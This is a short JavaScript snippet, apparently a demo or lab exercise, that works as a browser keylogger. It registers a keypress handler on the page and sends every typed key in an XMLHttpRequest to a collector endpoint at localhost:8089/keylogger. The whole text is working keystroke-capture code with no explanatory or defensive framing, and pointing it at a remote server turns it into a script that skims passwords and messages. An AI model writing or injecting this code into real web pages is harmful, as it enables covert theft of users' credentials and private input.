const url = 'http://localhost:8089/keylogger?key='

document.onkeypress = e => {
    let k =  ''
    k += e.key
    let oReq = new XMLHttpRequest()
    oReq.open('get', url+k, true);
    oReq.send();
}
